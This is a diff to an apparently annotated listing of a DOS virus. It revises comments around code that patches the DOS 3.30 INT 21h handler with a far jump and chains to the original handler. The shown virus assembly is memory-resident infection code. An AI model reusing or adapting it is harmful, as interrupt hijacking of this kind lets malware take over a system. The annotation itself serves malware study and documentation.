@@ -62,7 +62,7 @@ dos_330_int21_hijack:
                      mov     ax, 1203h
                      int     2Fh             ; Return: DS = segment of IBMDOS.COM/MSDOS.SYS
                      mov     word [es: k_virus_memory_location + virus_body_end - virus_start], ds ; save DOS data segment for later INT 21h calls
-                     mov     si, 1460h       ; DOS 3.30 stores here the INT 21h address
+                     mov     si, 1460h       ; DOS 3.30-specific code location overwritten with a far jump
                      mov     byte [si], 0EAh ; JMP FAR
                      mov     word [si+3], es ; 0
                      mov     word [si+1], k_virus_memory_location + int21_handler - virus_start
@@ -294,10 +294,10 @@ prepare_for_int21_return:
                      pop     ax
 
 execute_original_int_21:
-                     jmp     0:1467h         ; DOS 3.30: jumps to 0:1467h (original DOS INT 21h entry)
-                                             ; Generic DOS: segment (0) is overwritten with saved INT 21h segment
+                     jmp     0:1467h         ; DOS 3.30 path patches the segment with the DOS segment returned by INT 2Fh/AX=1203h
+                                             ; The initial zero segment is a placeholder, not the installed DOS 3.30 destination
 
-virus_body_end:      equ $ - 2               ; Excludes last 2 bytes (JMP segment) from virus body.
-                                             ; Generic DOS path stores original INT 21h vector here during
-                                             ; installation (lines 75-78), overwriting the segment part of
-                                             ; the JMP instruction. DOS 3.30 path uses hardcoded 0:1467h.
+virus_body_end:      equ $ - 2               ; Excludes the JMP segment word from the copied virus body.
+                                             ; Generic DOS path copies the saved vector starting here: its offset
+                                             ; overwrites this segment word, and its segment follows it.
+                                             ; This listing therefore does not establish a valid generic far-jump target.
